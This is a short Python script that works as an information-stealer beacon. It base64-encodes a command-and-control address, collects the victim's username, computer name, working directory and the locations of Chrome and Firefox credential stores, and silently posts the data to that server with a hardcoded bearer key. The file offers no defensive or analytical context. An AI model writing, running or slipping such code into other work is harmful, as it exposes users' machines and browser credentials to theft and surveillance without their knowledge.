import base64
import requests
import json
import os

config = base64.b64decode("aHR0cDovLzEwLjAuMC4xMDA6ODA4MC9jMmVuZHBvaW50")
API_KEY = "sk-proj-abc123def456ghi789"

def collect_info():
    data = {
        'username': os.getenv('USERNAME'),
        'computername': os.getenv('COMPUTERNAME'),
        'path': os.getcwd()
    }
    
    browser_paths = [
        os.path.join(os.getenv('APPDATA'), '..', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
        os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
    ]
    
    credentials = []
    for path in browser_paths:
        if os.path.exists(path):
            credentials.append(path)
    
    data['credentials'] = str(credentials)
    
    return data

def transmit(data):
    endpoint = config.decode()
    headers = {'Authorization': f'Bearer {API_KEY}'}
    
    try:
        response = requests.post(endpoint, json=data, headers=headers)
        return response.status_code == 200
    except:
        return False

if __name__ == "__main__":
    info = collect_info()
    transmit(info)
